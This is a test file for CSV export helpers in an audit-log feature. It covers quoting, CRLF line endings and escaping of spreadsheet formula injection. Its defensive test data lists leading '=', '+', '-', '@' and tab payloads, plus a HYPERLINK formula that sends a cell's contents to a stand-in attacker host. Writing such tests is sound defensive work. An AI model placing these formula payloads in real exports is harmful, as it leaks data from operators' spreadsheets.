/**
 * The audit export carries text that came from outside the platform — a company
 * name, a ticket subject, an event payload — into a file a platform operator
 * opens in a spreadsheet. Both halves of that sentence are attack surface: the
 * CSV grammar, and the spreadsheet's formula evaluator.
 */
import { csvDocument, csvField, csvRow } from './csv';

describe('csvField', () => {
  const cases: Array<[string, unknown, string]> = [
    ['leaves plain text alone', 'company.registered', 'company.registered'],
    ['quotes a field containing a comma', 'Acme, Inc', '"Acme, Inc"'],
    ['quotes and doubles an embedded quote', 'the "big" one', '"the ""big"" one"'],
    ['quotes a field containing a newline', 'line one\nline two', '"line one\nline two"'],
    ['quotes a field containing a carriage return', 'a\rb', '"a\rb"'],
    ['renders a timestamp as ISO 8601', new Date('2026-03-01T12:00:00Z'), '2026-03-01T12:00:00.000Z'],
    ['renders a number without quoting it', 42, '42'],
    ['renders null as an empty field', null, ''],
    ['renders undefined as an empty field', undefined, ''],
    ['serialises an object payload as JSON', { plan: 'pro' }, '"{""plan"":""pro""}"'],
  ];

  it.each(cases)('%s', (_label, input, expected) => {
    expect(csvField(input)).toBe(expected);
  });

  describe('spreadsheet formula injection', () => {
    // Every one of these is a cell a tenant can put there — a company name, a
    // ticket subject — that a spreadsheet would otherwise execute on an
    // operator's machine.
    const dangerous: Array<[string, string]> = [
      ['equals', '=1+1'],
      ['plus', '+1+1'],
      ['minus', '-1+1'],
      ['at sign', '@SUM(A1)'],
      ['tab', '\tcmd'],
      ['a real exfiltration attempt', '=HYPERLINK("http://evil.example/?"&A1,"click")'],
    ];

    it.each(dangerous)('neutralises a cell beginning with a %s', (_label, input) => {
      const field = csvField(input);
      const value = field.startsWith('"') ? field.slice(1, -1).replace(/""/g, '"') : field;

      expect(value.startsWith("'")).toBe(true);
      // The original text survives intact after the guard; this is an escape,
      // not a filter, and an auditor must still be able to read what was said.
      expect(value.slice(1)).toBe(input);
    });

    it('leaves a cell that merely contains an equals sign alone', () => {
      // Only a leading character is evaluated, and quoting every cell with an
      // equals sign anywhere in it would mangle ordinary payloads.
      expect(csvField('a=b')).toBe('a=b');
    });
  });
});

describe('csvRow', () => {
  it('joins fields with commas', () => {
    expect(csvRow(['a', 'b', 'c'])).toBe('a,b,c');
  });

  it('keeps an empty field as an empty column rather than dropping it', () => {
    expect(csvRow(['a', '', 'c'])).toBe('a,,c');
  });
});

describe('csvDocument', () => {
  it('writes a header and CRLF line endings', () => {
    // RFC 4180 says CRLF, and Excel on Windows reads a lone LF as one enormous
    // cell.
    const document = csvDocument(['id', 'name'], [['1', 'Acme']]);
    expect(document).toBe('id,name\r\n1,Acme\r\n');
  });

  it('writes just the header when nothing matched', () => {
    // A header-only file is a valid answer to a filter that matched nothing; an
    // empty file looks like the export failed.
    expect(csvDocument(['id'], [])).toBe('id\r\n');
  });
});
